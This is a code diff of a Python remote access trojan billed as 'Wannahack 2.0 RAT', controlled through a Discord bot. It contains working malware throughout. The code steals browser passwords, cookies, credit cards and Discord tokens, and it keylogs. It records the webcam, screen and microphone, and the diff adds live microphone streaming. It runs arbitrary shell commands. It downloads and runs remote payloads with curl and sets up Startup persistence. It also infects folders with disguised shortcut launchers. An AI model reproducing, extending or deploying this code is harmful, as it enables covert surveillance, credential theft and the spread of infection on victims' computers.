@@ -16,7 +16,6 @@ DISCORD RAT WANNAHACK?
 
 import asyncio
 import base64
-import concurrent
 import ctypes
 import datetime
 import getpass
@@ -25,7 +24,6 @@ import os
 import random
 import re
 import shutil
-
 import socket
 import sqlite3
 import subprocess
@@ -42,6 +40,7 @@ import discord
 import moviepy.video.io.VideoFileClip
 import numpy as np
 import psutil
+import pyaudio
 import pyautogui
 import requests
 import sounddevice as sd
@@ -62,11 +61,11 @@ pcname = socket.gethostname()
 adm1n = ctypes.windll.shell32.IsUserAnAdmin().__bool__()
 processid = os.getpid()
 
-mainfolder = f"C://Users//{us3rn4me}//APPDATA//Roaming//Chrome"
-keylogfile = f"{mainfolder}//k3yl0g.txt"
+mainfolder = f"C:\\Users\\{us3rn4me}\\APPDATA\\Roaming\\Chrome"
+keylogfile = f"{mainfolder}\\k3yl0g.txt"
 
-clientinfo = f"`👤` {us3rn4me}@{pcname} `🆔` ID: {v1ct1m1d} `👑` Admin: {adm1n}"
-textclientinfo = f"{us3rn4me}@{pcname}"
+FULLCLIENTINFO = f"`👤` {us3rn4me}@{pcname} `🆔` ID: {v1ct1m1d} `👑` Admin: {adm1n}"
+SHORTCLIENTINFO = f"{us3rn4me}@{pcname}"
 
 USERDIR = os.getenv("USERPROFILE")
 APPDATA = os.getenv("APPDATA")
@@ -78,18 +77,16 @@ VARENVLIST = {
     "%USERPROFILE%": USERDIR,
     "%LOCALAPPDATA%": LOCAL,
     "%TEMP%": TEMP,
-    "%STARTUP%": f"{APPDATA}//Microsoft//Windows//Start Menu//Programs//Startup",
+    "%STARTUP%": f"{APPDATA}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
     "%MAINDIR%": mainfolder
 }
-
+bs = '\\'
 ratgifurl = "https://cdn.discordapp.com/attachments/1169570134734688267/1217501334341685249/rat.gif?ex=6604417a&is=65f1cc7a&hm=5f84c602487a3ee1c7ccad1a90f779dfbe8073bfe8aac114c6595b5d8b2d7114&"
 
 gifs = {
     'android': 'https://cdn.discordapp.com/attachments/1202136082557173841/1220021932356009994/fileanim.gif?ex=660d6cf7&is=65faf7f7&hm=5669412f7ebfd140ff9cee0b6d06b25c56ad083ff938a95c1adfd3501e68659c&',
     'pchacking': 'https://cdn.discordapp.com/attachments/1202136082557173841/1219745518708592690/fileanim.gif?ex=660c6b89&is=65f9f689&hm=449c51d4e1b65d40455fd1842a6aacd91bd28ba18ed6d630b2bb34ce7b44a0a7&',
-    'matrix': 'https://cdn.discordapp.com/attachments/1202136082557173841/1220022819979526204/fileanim.gif?ex=660d6dcb&is=65faf8cb&hm=ba7b7324192b7d942bbd262cddd3243e781485ceb52333afde58d10d9b3a054c&',
     'earth': 'https://cdn.discordapp.com/attachments/1202136082557173841/1219665857962049576/earth1.gif?ex=660c2158&is=65f9ac58&hm=ad4f3e6e83f1215298f6217ef62d9c51f6e5cb1e15cca3470956ed9fcc677a53&',
-    'pacman': 'https://cdn.discordapp.com/attachments/1202136082557173841/1220046021720146034/fileanim.gif?ex=660d8366&is=65fb0e66&hm=17a58f0c954883e5a7ef8d4a237d548d0db716bc449f7247563743be4374f01a&'
 }
 
 helptext = """
@@ -113,7 +110,7 @@ helptext = """
 -> !reccam [seconds] - Gets a recording from the camera
 -> !recscreen [seconds] - Gets a recording of the screen
 -> !recaudio [seconds] - Records audio from available sound device
--> !browserdata - Gets all browser info - passwords, cookies etc.
+-> !grabbrowsers - Gets all browser info - passwords, cookies etc.
 -> !grabdiscord - Gets all discord tokens and basic account info
 -> !dumpkeylog - Sends the keylog file (keylogger built in)
 -> !wifi - Gets all wifi networks
@@ -124,7 +121,9 @@ helptext = """
 -> !shortcut - Uses a shortcut ex. alt f4
 -> !timedplay [song] [time] - Plays a song at a specified time ex. !timedplay song.mp3 15:21:37
 -> !playaudio [song] - Plays a song
--> !infectfolder [folder] - Infects a folder with the rat
+-> !infectfolder [path] - Infects a folder with the rat
+-> !startlivemicrophone - Starts live listening to the microphone
+-> !stoplivemicrophone - Stop s live listening to the microphone
 """
 
 browserdiscordpaths = [
@@ -255,19 +254,19 @@ bot = Bot()
 
 
 def setup():
-    paths = [mainfolder, mainfolder + "//music"]
+    paths = [mainfolder, mainfolder + "\\music"]
     for p in paths:
         if not os.path.exists(p): os.mkdir(p)
 
-    if os.path.exists(f"{TEMP}//uacelevate.txt"):
+    if os.path.exists(f"{TEMP}\\uac.txt"):
         try:
-            oldpidfile = open(f"{TEMP}//uacelevate.txt", "r")
+            oldpidfile = open(f"{TEMP}\\uac.txt", "r")
             oldpid = int(oldpidfile.read())
             oldpidfile.close()
 
             oldprocess = psutil.Process(oldpid)
             oldprocess.kill()
-            os.remove(f"{TEMP}//uacelevate.txt")
+            os.remove(f"{TEMP}\\uac.txt")
         except psutil.NoSuchProcess as e:
             print(e)
 
@@ -335,15 +334,14 @@ def unsplit(list):
 
 
 def getfileextension(path):
-    return str(os.path.basename(path)).split("//")[-1].split(".")[-1]
+    return str(os.path.basename(path)).split("\\")[-1].split(".")[-1]
 
 
 def getfileio(path):
     try:
         return requests.post(
-            f"https://{requests.get('https://api.gofile.io/getServer').json()['data']['server']}.gofile.io/uploadFile",
-            files={"file": open(path, "rb")},
-        ).json()["data"]["downloadPage"]
+            f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',
+            files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
     except:
         return False
 
@@ -351,14 +349,14 @@ def getfileio(path):
 def getfileembed(path):
     image = ["png", "jpg", "jpeg", "webp"]
     if not os.path.exists(path): return
-    embed = discord.Embed(color=0x2B2D31, title=f"`💾` {str(os.path.basename(path)).split('//')[-1]}",
+    embed = discord.Embed(color=0x2B2D31, title=f"`📁` {str(os.path.basename(path)).split('//')[-1]}",
                           description=
-                          f"`📊 Filesize:` `{bytestoreadable(os.path.getsize(path))}`\n"
-                          f"`🕙 Creation time:` `{datetime.datetime.fromtimestamp(os.path.getctime(path)).strftime('%A, %B %d, %Y %I:%M:%S')}`\n"
-                          f"`📁 Exact path:` `{path}`")
+                          f"`Filesize:` `{bytestoreadable(os.path.getsize(path))}`\n"
+                          f"`Creation time:` `{datetime.datetime.fromtimestamp(os.path.getctime(path)).strftime('%A, %B %d, %Y %I:%M:%S')}`\n"
+                          f"`Origin:` `{path}`")
     embed.set_thumbnail(
         url=list(gifs.values())[random.randrange(0, len(gifs))])
-    embed.set_footer(text=textclientinfo)
+    embed.set_footer(text=SHORTCLIENTINFO)
     embed.url = getfileio(path)
     return embed
 
@@ -370,6 +368,29 @@ def shortcut(key1, key2):
     time.sleep(0.4)
     pyautogui.keyUp(key2)
     pyautogui.keyUp(key1)
+
+
+def bytestoreadable(size):
+    conversionfactors = {
+        "b": 1,
+        "kb": 1024,
+        "mb": 1024 * 1024,
+        "gb": 1024 * 1024 * 1024,
+        "tb": 1024 * 1024 * 1024 * 1024,
+    }
+    try:
+        unit = max(unit for unit, factor in conversionfactors.items() if factor < size)
+        file_size_in_unit = size / conversionfactors[unit]
+        file_size_string = f"{file_size_in_unit:.2f} {unit}"
+        return file_size_string
+    except ValueError as e:
+        return "Error"
+
+
+def writetofile(content, path):
+    with open(path, 'w', encoding='utf-8') as f:
+        f.write(content)
+        f.close()
 
 
 def playaudio(path):
@@ -430,16 +451,16 @@ def decryptpassword(buff: bytes, key: bytes) -> str:
 
 
 def getbrowserdata(path: str, profile: str, key, type_of_data):
-    try:
-        db_file = f"""{path}\\{profile}{type_of_data['file']}"""
-        if not os.path.exists(db_file):
-            return
-        result = ""
-        shutil.copy(db_file, "temp_db")
-        conn = sqlite3.connect("temp_db")
-        cursor = conn.cursor()
-        cursor.execute(type_of_data["query"])
-        for row in cursor.fetchall():
+    db_file = f"""{path}\\{profile}{type_of_data['file']}"""
+    if not os.path.exists(db_file):
+        return
+    result = ""
+    shutil.copy(db_file, "temp_db")
+    conn = sqlite3.connect("temp_db")
+    cursor = conn.cursor()
+    cursor.execute(type_of_data["query"])
+    for row in cursor.fetchall():
+        try:
             row = list(row)
             if type_of_data["decrypt"]:
                 for i in range(len(row)):
@@ -450,55 +471,30 @@ def getbrowserdata(path: str, profile: str, key, type_of_data):
                     row[2] = convertchrometime(row[2])
                 else:
                     row[2] = "0"
-
-            # print(type_of_data['columns'])
-            # print(zip(type_of_data['columns'], row))
             check = ""
             for a, b in zip(type_of_data["columns"], row):
                 check += f"{b}"
-
             if check != "":
                 for col, val in zip(type_of_data["columns"], row):
                     result += f"║ {col}: {val}\n"
-
                 result += f"╠══════════════════════════════════════════════════════════════════════\n"
 
-        conn.close()
-        os.remove("temp_db")
-        return result
-    except PermissionError as e:
-        print(e)
-    except sqlite3.OperationalError as e:
-        print(e)
+        except PermissionError as e:
+            print(e)
+        except sqlite3.OperationalError as e:
+            print(e)
+        except ValueError as e:
+            print(e)
+
+    conn.close()
+    os.remove("temp_db")
+    return result
 
 
 def convertchrometime(chrome_time):
     return (
             datetime(1601, 1, 1) + datetime.timedelta(microseconds=chrome_time)
     ).strftime("%d/%m/%Y %H:%M:%S")
-
-
-def bytestoreadable(size_in_bytes):
-    conversion_factors = {
-        "b": 1,
-        "kb": 1024,
-        "mb": 1024 * 1024,
-        "gb": 1024 * 1024 * 1024,
-        "tb": 1024 * 1024 * 1024 * 1024,
-    }
-    try:
-        unit = max(unit for unit, factor in conversion_factors.items() if factor < size_in_bytes)
-        file_size_in_unit = size_in_bytes / conversion_factors[unit]
-        file_size_string = f"{file_size_in_unit:.2f} {unit}"
-        return file_size_string
-    except ValueError as e:
-        return "Error"
-
-
-def writetofile(content, path):
-    with open(path, 'w', encoding='utf-8') as f:
-        f.write(content)
-        f.close()
 
 
 @bot.event
@@ -511,7 +507,7 @@ async def on_ready():
     process.daemon = True
     process.start()
 
-    await bot.get_channel(ratt1ngchann3l1d).send(f"@here `🔔` | {clientinfo} is online!")
+    await bot.get_channel(ratt1ngchann3l1d).send(f"@here `🔔` | {FULLCLIENTINFO} is online!")
     print(Fore.LIGHTWHITE_EX)
 
 
@@ -525,127 +521,71 @@ async def on_message(message, os=os, pyautogui=pyautogui, cv2=cv2):
                 if args[i].find(env) != -1:
                     args[i] = args[i].replace(env, VARENVLIST[env])
 
-        print(args)
+        print(f"Recieved command >> {unsplit(args)}")
 
-        basecommand = args[0]
-        print(f"Recieved command >> {basecommand}")
-
-        if basecommand == "!control":
+        if args[0] == "!control":
             changecurrentid(args[1])
             if args[1] == v1ct1m1d:
-                await message.channel.send(f"`🎮` You are currently controlling {clientinfo}!")
+                await message.channel.send(f"`🎮` You are currently controlling {FULLCLIENTINFO}!")
 
-        if basecommand == "!select":
+        if args[0] == "!select":
             if v1ct1m1d in args[1:]:
                 changecurrentid(v1ct1m1d)
-                await message.channel.send(f"`🎮` You are currently controlling {clientinfo}!")
+                await message.channel.send(f"`🎮` You are currently controlling {FULLCLIENTINFO}!")
 
-        if basecommand == "!deselect":
+        if args[0] == "!deselect":
             if v1ct1m1d in args[1:]:
                 changecurrentid(-1)
-                await message.channel.send(f"`🚫` You succesfully stopped controlling {clientinfo}!")
+                await message.channel.send(f"`🚫` You succesfully stopped controlling {FULLCLIENTINFO}!")
 
-        if basecommand == "!activevictims":
-            await message.channel.send(clientinfo)
+        if args[0] == "!activevictims":
+            await message.channel.send(FULLCLIENTINFO)
 
-        if basecommand == "!masscontrol":
+        if args[0] == "!masscontrol":
             changecurrentid(v1ct1m1d)
-            await message.channel.send(f"`🎮` You are currently controlling {clientinfo}!")
+            await message.channel.send(f"`🎮` You are currently controlling {FULLCLIENTINFO}!")
 
         if cid == v1ct1m1d:
-            if basecommand == "!help":
+            if args[0] == "!help":
                 writetofile(helptext, TEMP + "\helpmenu.txt")
                 embed = discord.Embed(color=0x2B2D31, title="`🐀` `Wannahack 2.0 RAT`",
-                                      description="<a:dance:1218524808053260348> `Huge thanks to:`\n<@708923462072270931> `- Hardware hacking and rat dev.`\n<@830163807707201576> `- Rat developer`")
+                                      description="<a:dance:1218524808053260348> `Huge thanks to:`\n<@830163807707201576> `- Rat developer`\n<@708923462072270931> `- Hardware hacking and rat dev.`")
                 embed.set_thumbnail(url=ratgifurl)
                 await message.channel.send(embed=embed)
                 await message.channel.send(file=File(TEMP + "\helpmenu.txt"))
 
-            if basecommand == "!id":
-                await message.channel.send(clientinfo)
+            if args[0] == "!start":
+                subprocess.run(f"start {__file__}", shell=True)
 
-            if basecommand == "!installdependencies":
-                subprocess.run(
-                    f"curl -ko {mainfolder}/cmdmp3win.exe https://cdn.discordapp.com/attachments/1185616202190561300/1212046644263256194/cmdmp3win.exe?ex=65f06966&is=65ddf466&hm=533ba44cd78c68f4ae80bc271fa375de03bbac4828ca939086eabc68d02fb012&")
-                subprocess.run(
-                    f"curl -ko {mainfolder}/nircmd.exe https://cdn.discordapp.com/attachments/1185616202190561300/1212042560047157320/nircmd.exe?ex=65f06598&is=65ddf098&hm=4bba3f3240af95b3721188df5f938e3dc4480e18bf89d43312b2efaf2d9e958d&")
-                embed = discord.Embed(color=0x2B2D31, title="`👍` `Succesfully installed`",
-                                      description="```\n NirCmd.exe\n CmdMp3Win.exe```")
-                embed.set_image(
-                    url=ratgifurl)
-                await message.channel.send(embed=embed)
+            if args[0] == "!id":
+                await message.channel.send(FULLCLIENTINFO)
 
-            if basecommand == "!update":
-                embedlist = [
-                    discord.Embed(color=0x2B2D31, title="<a:update:1218539579947352094> `Updating the rat...`",
-                                  description="```css"
-                                              "[Downloading...]```"),
-                    discord.Embed(color=0x2B2D31, title="<a:update:1218539579947352094> `Updating the rat...`",
-                                  description="```Downloading... DONE```"),
-                    discord.Embed(color=0x2B2D31, title="<a:update:1218539579947352094> `Updating the rat...`",
-                                  description="```Extracting...```"),
-                    discord.Embed(color=0x2B2D31, title="<a:update:1218539579947352094> `Updating the rat...`",
-                                  description="```Extracting... DONE```"),
-                    discord.Embed(color=0x2B2D31, title="<a:update:1218539579947352094> `Updating the rat...`",
-                                  description="```Adding to Startup```"),
-                    discord.Embed(color=0x2B2D31, title="<a:update:1218539579947352094> `Updating the rat...`",
-                                  description="```Removing old build from Startup```"),
-                    discord.Embed(color=0x2B2D31, title="<a:update:1218539579947352094> `Updating the rat...`",
-                                  description="```FINISHED```"),
-                ]
+            if args[0] == "!update":
                 olddir = os.getcwd()
 
                 zipfilelink = args[1]
                 updatename = args[2]
                 clearold = args[3]
-                curlargs = "-L -o"
+                curlargs = "-ko"
 
                 installdirectory = VARENVLIST['%USERPROFILE%'] + "\\URNGuest"
 
                 if len(args) > 4:
                     curlargs = args[4]
-                e = embedlist[0]
-                e.set_image(url=ratgifurl)
-                updatemessage = await message.channel.send(embed=e)
                 if not os.path.exists(installdirectory): os.mkdir(installdirectory)
                 print(f"curl {curlargs} {installdirectory}/{updatename}.rar {zipfilelink}")
                 os.system(f'curl {curlargs} {installdirectory}/{updatename}.rar "{zipfilelink}"')
-                e = embedlist[1]
-                e.set_image(url=ratgifurl)
-
-                await updatemessage.edit(embed=e)
                 os.chdir(installdirectory)
-                e = embedlist[2]
-                e.set_image(url=ratgifurl)
-
-                await updatemessage.edit(embed=e)
                 os.system(f"tar -xf {updatename}.rar")
                 time.sleep(0.5)
-
-                e = embedlist[3]
-                e.set_image(url=ratgifurl)
-
-                await updatemessage.edit(embed=e)
                 exefilepath = None
                 for f in os.listdir(updatename):
                     if getfileextension(f) == "exe":
                         exefilepath = f"{installdirectory}/{updatename}/{f}"
+
                 with open(VARENVLIST['%STARTUP%'] + f"/{updatename}.bat", "w") as startupbatch:
                     startupbatch.write(f"@echo off\nstart {exefilepath}")
                     startupbatch.close()
-                e = embedlist[4]
-                e.set_image(url=ratgifurl)
-
-                await updatemessage.edit(embed=e)
-                time.sleep(0.5)
-
-                e = embedlist[5]
-                e.set_image(url=ratgifurl)
-
-                await updatemessage.edit(embed=e)
-
-                e = embedlist[6]
-                await updatemessage.edit(embed=e)
                 os.chdir(olddir)
                 os.system(f"start cmd /c start {exefilepath}")
                 if clearold == 'True':
@@ -661,89 +601,67 @@ async def on_message(message, os=os, pyautogui=pyautogui, cv2=cv2):
                     ratprocess = psutil.Process(pid)
                     ratprocess.kill()
 
-            if basecommand == "!infectfolder":
-                installer = f"""
-@echo off
-set "zipUrl=https://github.com/FoliowiecGit/Eduware/releases/download/eduware/AdobeUpdateService32.zip"
-set "downloadPath=%USERPROFILE%\\URN"
-if exist "%downloadPath%" exit
-if not exist "%downloadPath%" mkdir "%downloadPath%"
-curl -L -o "%downloadPath%\sys.rar" "%zipUrl%"
-C:
-cd %downloadPath%
-tar -xf sys.rar
-set "startup=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-set "batchScriptPath=%startup%\sys.bat"
-(
-echo @echo off
-echo start "" "%downloadPath%"
-) > "%batchScriptPath%"
-start "" "%downloadPath%"
-                """
+            if args[0] == "!infectfolder":
+                folder = args[1]
+                fakefolder = f"{folder}\\sys"
+                os.chdir(os.path.normpath(folder))
 
-                directory = os.path.normpath(args[1])
-                fakefolder = directory + "\\sys"
-                if not os.path.exists(fakefolder):
-                    os.mkdir(fakefolder)
-                os.system(f"curl -L -o {fakefolder}\\blank.ico https://github.com/Foliowiec/WannaHack/raw/main/blank.ico")
-                with open(f"{fakefolder}/sys.bat", 'w') as b:
-                    b.write(installer)
-                    b.close()
-                for path in os.listdir(directory):
-                    filename = path
-                    path = directory + f"\\{path}"
-                    if filename == "sys":
+                os.system(f"mkdir {folder}\\sys & attrib +h /s /d {folder}\\sys")
+                os.system(
+                    f"curl -L -o {fakefolder}\\blank.ico https:\\github.com/Foliowiec/WannaHack/raw/main/blank.ico")
+                os.system(
+                    f"curl -L -o {folder}\\sys\\system32.bat https:\\raw.githubusercontent.com/Foliowiec/WannaHack/main/installer.bat")
+                for filename in os.listdir(os.path.normpath(folder)):
+                    if filename == "sys" or filename == "sys.bat":
                         continue
-                    if os.path.isfile(path):
-                        os.system(f'xcopy "{path}" "{fakefolder}"')
-                        os.remove(path)
-                        ratbatchcontent = f"""
+                    if os.path.isfile(os.path.normpath(folder + f"\\{filename}")):
+                        ffcontent = f"""
 @echo off
-if not exist %USERPROFILE%\\URN start /min "" "{fakefolder}\\sys.bat"
-"{os.path.normpath(fakefolder + '/' + filename)}"
+if not exist %USERPROFILE%\\URN start /min "" "{fakefolder}\\system32.bat"
+"{os.path.normpath(fakefolder + "/" + filename)}"
                 """
                     else:
-                        shutil.copytree(path, fakefolder)
-                        shutil.rmtree(path)
-                        ratbatchcontent = f"""
+                        ffcontent = f"""
 @echo off
-if not exist %USERPROFILE%\\URN start /min "" "{fakefolder}\\sys.bat"
+if not exist %USERPROFILE%\\URN start /min "" "{fakefolder}\\system32.bat"
 explorer.exe "{os.path.normpath(fakefolder + '/' + filename)}"
                 """
 
-                    with open(f"{fakefolder}/{filename}'.bat", 'w') as b:
-                        b.write(ratbatchcontent)
-                        b.close()
+                    shutil.move(os.path.normpath(folder + f"\\{filename}"), os.path.normpath(folder + f"\\sys"))
+                    with open(fakefolder + "\\" + f"{filename}'.bat", 'w') as ff:
+                        ff.write(ffcontent)
+
                     shortcutbatchcontent = f"""
 @echo off
 echo Set oWS = WScript.CreateObject("WScript.Shell") > CreateShortcut.vbs
-echo sLinkFile = "{directory}\\{filename}.lnk" >> CreateShortcut.vbs
+echo sLinkFile = "{folder}\\{filename}.lnk" >> CreateShortcut.vbs
 echo Set oLink = oWS.CreateShortcut(sLinkFile) >> CreateShortcut.vbs
 echo oLink.TargetPath = "{fakefolder}\\{filename}'.bat" >> CreateShortcut.vbs
 echo oLink.IconLocation = "{fakefolder}\\blank.ico,0" >> CreateShortcut.vbs
 echo oLink.Save >> CreateShortcut.vbs
 cscript CreateShortcut.vbs
 del CreateShortcut.vbs
-                """
+                                """
 
-                    with open(f"{directory}/sys.bat", 'w') as b:
-                        b.write(shortcutbatchcontent)
-                        b.close()
+                    with open(folder + "\\" + f"sys.bat", 'w') as sysf:
+                        sysf.write(shortcutbatchcontent)
+                        sysf.close()
 
-                    subprocess.run(f"{directory}/sys.bat", shell=True)
+                    subprocess.run(folder + "\\" + f"sys.bat", shell=True)
+                os.remove(folder + "\\" + f"sys.bat")
 
-                os.system(f"attrib +h /s /d {fakefolder} & del {directory}/sys.bat")
-
-            if basecommand == "!cd":
+            if args[0] == "!cd":
                 if os.path.exists(args[1]):
                     os.chdir(args[1])
                 embed = discord.Embed(color=0x2B2D31,
                                       title=f"{emojis['disk']} `Current working directory changed to:`",
                                       description=f"```{os.getcwd()}```")
-                embed.set_footer(text=textclientinfo)
+                embed.set_footer(text=SHORTCLIENTINFO)
                 await message.channel.send(embed=embed)
 
-            if basecommand == "!dir":
+            if args[0] == "!pwd":
+                await message.channel.send(f"`📁 {os.getcwd()}`")
+            if args[0] == "!dir":
                 def getdirectory(directory, indent=0, depth=0):
                     try:
                         contents = os.listdir(directory)
@@ -763,26 +681,13 @@ del CreateShortcut.vbs
                             elif os.path.isfile(item_path):
                                 is_last_item = i < len(contents) - 1
                                 if is_last_item:
-                                    tree += (
-                                            "   " * indent
-                                            + "╟ 📄 "
-                                            + item
-                                            + " "
-                                            + bytestoreadable(os.path.getsize(item_path))
-                                            + "\n"
-                                    )
+                                    tree += ("   " * indent + "╟ 📄 " + item + " " + bytestoreadable(
+                                        os.path.getsize(item_path)) + "\n")
                                 else:
-                                    tree += (
-                                            "   " * indent
-                                            + "╙ 📄 "
-                                            + item
-                                            + " "
-                                            + bytestoreadable(os.path.getsize(item_path))
-                                            + "\n"
-                                    )
+                                    tree += ("   " * indent + "╙ 📄 " + item + " " + bytestoreadable(
+                                        os.path.getsize(item_path)) + "\n")
                             else:
                                 continue
-
                         return tree
                     except PermissionError as e:
                         return ""
@@ -797,27 +702,29 @@ del CreateShortcut.vbs
                     directory = os.getcwd()
                     depth = 3
 
-                f = open(f"{mainfolder}//dir.txt", "w", encoding="utf-8")
+                f = open(f"{mainfolder}\\dir.txt", "w", encoding="utf-8")
                 f.write(f"DIRECTORY TREE OF {directory}\n\n" + getdirectory(directory, depth=int(depth)))
                 f.close()
-                await message.channel.send(file=File(f"{mainfolder}//dir.txt"))
+                await message.channel.send(file=File(f"{mainfolder}\\dir.txt"))
 
-            if basecommand == "!cmd":
+            if args[0] == "!cmd":
                 command = unsplit(args[1:])
-                subprocess.run(f"cd {os.getcwd()} & {command} >> {mainfolder}//output.txt", shell=True)
+                subprocess.run(f"cd {os.getcwd()} & {command} >> {mainfolder}\\output.txt", shell=True,)
                 time.sleep(1.5)
-                embed = discord.Embed(color=0x2B2D31, title=f"{emojis['pchacking']} `Executed command:`",
-                                      description=f"```{command}``` \n{emojis['folder']} `Command output:`")
-                embed.set_footer(text=textclientinfo)
+                embed = discord.Embed(color=0x2B2D31,
+                                      description=f"`{os.getcwd()}>`\n"
+                                                  f"```{command}```\n"
+                                                  f"`Command output:`")
+                embed.set_footer(text=SHORTCLIENTINFO)
                 await message.channel.send(embed=embed)
                 try:
-                    await message.channel.send(file=File(f"{mainfolder}//output.txt"))
+                    await message.channel.send(file=File(f"{mainfolder}\\output.txt"))
                 except discord.errors.HTTPException:
-                    await message.channel.send(embed=getfileembed(f"{mainfolder}//output.txt"))
+                    await message.channel.send(embed=getfileembed(f"{mainfolder}\\output.txt"))
                 time.sleep(1.5)
-                os.remove(f"{mainfolder}//output.txt")
+                os.remove(f"{mainfolder}\\output.txt")
 
-            if basecommand == "!run":
+            if args[0] == "!run":
                 command = args[1]
 
                 shortcut("r", "win")
@@ -826,12 +733,13 @@ del CreateShortcut.vbs
                 pyautogui.sleep(0.2)
                 pyautogui.press("enter")
 
-                embed = discord.Embed(color=0x2B2D31, title=f"{emojis['pchacking']} `Executed run command:`",
-                                      description=f"```{command}```")
-                embed.set_footer(text=textclientinfo)
+                embed = discord.Embed(color=0x2B2D31, title=f"`Win + R >> {command}`")
+                embed.set_thumbnail(
+                    url=list(gifs.values())[random.randrange(0, len(gifs))])
+                embed.set_footer(text=SHORTCLIENTINFO)
                 await message.channel.send(embed=embed)
 
-            if basecommand == "!timedplay":
+            if args[0] == "!timedplay":
                 def gethour():
                     currenttime = urlopen("http://just-the-time.appspot.com/")
                     currentstrtime = str(currenttime.read().strip())[-9:-1]
@@ -840,47 +748,41 @@ del CreateShortcut.vbs
                     currentstrtime = currentstrtime.replace(currenthour, utcplus1hour)
                     return currentstrtime
 
-                path = mainfolder + "/music/" + args[1]
-                if not os.path.exists(path):
+                path = mainfolder + "\\music\\" + args[1]
+
+                if not os.path.exists(path) or sum(
+                        [a * b for a, b in zip([3600, 60, 1], map(int, gethour().split(':')))]) > sum(
+                        [a * b for a, b in zip([3600, 60, 1], map(int, args[2].split(':')))]):
                     return
+                print(str(args[2]))
                 while True:
                     ctime = gethour()
                     print(ctime)
-                    if ctime == args[2]:
+                    if ctime == str(args[2]):
                         break
-                embed = discord.Embed(color=0x2B2D31)
-                embed.set_footer(text=textclientinfo)
-                embed.add_field(name="", value=f"`🎶 Playing file!` \n ```{path}```", inline=True)
-                embed.set_thumbnail(
-                    url="https://i.pinimg.com/originals/63/17/31/63173162a98b20f741f434b2ee1b5de4.gif")
-                await message.channel.send(embed=embed)
+                await message.channel.send("`🎶 Playing file!`")
                 playaudio(path)
 
-            if basecommand == "!playaudio":
-                path = mainfolder + "/music/" + args[1]
+            if args[0] == "!playaudio":
+                path = mainfolder + "\\music\\" + args[1]
                 if not os.path.exists(path):
                     return
-                embed = discord.Embed(color=0x2B2D31)
-                embed.set_footer(text=textclientinfo)
-                embed.add_field(name="", value=f"`🎶 Playing file!` \n ```{path}```", inline=True)
-                embed.set_thumbnail(
-                    url="https://i.pinimg.com/originals/63/17/31/63173162a98b20f741f434b2ee1b5de4.gif")
-                await message.channel.send(embed=embed)
+                await message.channel.send("`🎶 Playing file!`")
                 playaudio(path)
 
-            if basecommand == "!screenshot":
-                pyautogui.screenshot().save(f"{mainfolder}//screenshot.png")
-                await message.channel.send(file=File(f"{mainfolder}//screenshot.png"))
+            if args[0] == "!screenshot" or args[0] == "!ss":
+                pyautogui.screenshot().save(f"{mainfolder}\\screenshot.png")
+                await message.channel.send(file=File(f"{mainfolder}\\screenshot.png"))
 
-            if basecommand == "!photo":
+            if args[0] == "!photo" or args[0] == "!pp":
                 camport = 0
                 camera = cv2.VideoCapture(camport)
                 returnvalue, image = camera.read()
-                cv2.imwrite(TEMP + "\photo.png", image)
-                await message.channel.send(file=File(TEMP + "\photo.png"))
+                cv2.imwrite(TEMP + "\\photo.png", image)
+                await message.channel.send(file=File(TEMP + "\\photo.png"))
 
-            if basecommand == "!recaudio":
-                soundpath = TEMP + "\sound.wav"
+            if args[0] == "!recaudio":
+                soundpath = TEMP + "\\sound.wav"
                 fs = 44100
                 duration = int(args[1])
                 record_voice = sd.rec(int(duration * fs), samplerate=fs, channels=2)
@@ -891,9 +793,27 @@ del CreateShortcut.vbs
                 except discord.errors.HTTPException:
                     await message.channel.send(embed=getfileembed(soundpath))
 
-            if basecommand == "!reccam":
+            if args[0] == "!startlivemicrophone":
+                class PyAudioPCM(discord.AudioSource):
+                    def __init__(self, channels=2, rate=48000, chunk=960, input_device=1) -> None:
+                        p = pyaudio.PyAudio()
+                        self.chunks = chunk
+                        self.input_stream = p.open(format=pyaudio.paInt16, channels=channels, rate=rate, input=True,
+                                                   input_device_index=input_device, frames_per_buffer=chunk)
+
+                    def read(self) -> bytes:
+                        return self.input_stream.read(self.chunks)
+
+                voicechannel = await message.author.voice.channel.connect(self_mute=False)
+                voicechannel.play(PyAudioPCM())
+
+            if args[0] == "!stoplivemicrophone":
+                for voiceclient in bot.voice_clients:
+                    return await voiceclient.disconnect(force=True)
+
+            if args[0] == "!reccam":
                 async def cam():
-                    videopath = TEMP + r"\camrecording.mp4"
+                    videopath = TEMP + "\\camrecording.mp4"
 
                     vidcapture = cv2.VideoCapture(0)
                     vidcod = cv2.VideoWriter_fourcc(*'XVID')
@@ -913,7 +833,7 @@ del CreateShortcut.vbs
                     output.release()
 
                     video = moviepy.video.io.VideoFileClip.VideoFileClip(videopath)
-                    path = TEMP + r"\camvideo.mp4"
+                    path = TEMP + "\\camvideo.mp4"
                     video.write_videofile(path)
 
                     try:
@@ -923,10 +843,10 @@ del CreateShortcut.vbs
 
                 await asyncio.create_task(cam())
 
-            if basecommand == "!recscreen":
+            if args[0] == "!recscreen":
                 fps = 24.0
                 recordingtime = int(args[1])
-                videopath = TEMP + "/video.avi"
+                videopath = TEMP + "\\video.avi"
                 SCREEN_SIZE = tuple(pyautogui.size())
 
                 fourcc = cv2.VideoWriter_fourcc(*"XVID")
@@ -951,47 +871,33 @@ del CreateShortcut.vbs
                 except discord.errors.HTTPException:
                     await message.channel.send(embed=getfileembed(path))
 
-            if basecommand == "!dumpkeylog":
+            if args[0] == "!dumpkeylog":
                 if not os.path.exists(keylogfile): return
                 await message.channel.send(embed=getfileembed(keylogfile))
                 os.remove(keylogfile)
 
-            if basecommand == "!browserdata":
+            if args[0] == "!grabbrowsers":
                 def installedbrowsers():
-                    return [x for x in browsers if os.path.exists(f"{x[1]}//Local State")]
+                    return [x for x in browsers if os.path.exists(f"{x[1]}\\Local State")]
 
-                p4ssw0rds = f"{mainfolder}//p4ssw0rds.txt"
-                c0okies = f"{mainfolder}//c0okies.txt"
-                h1st0ry = f"{mainfolder}//h1st0ry.txt"
-                cr3d1tc4rds = f"{mainfolder}//cr3d1tc4rds.txt"
-                d0wnloads = f"{mainfolder}//d0wnloads.txt"
-
-                datatypes = {
-                    "login_data": p4ssw0rds,
-                    "credit_cards": cr3d1tc4rds,
-                    "history": h1st0ry,
-                    "cookies": c0okies,
-                    "downloads": d0wnloads,
+                info = {
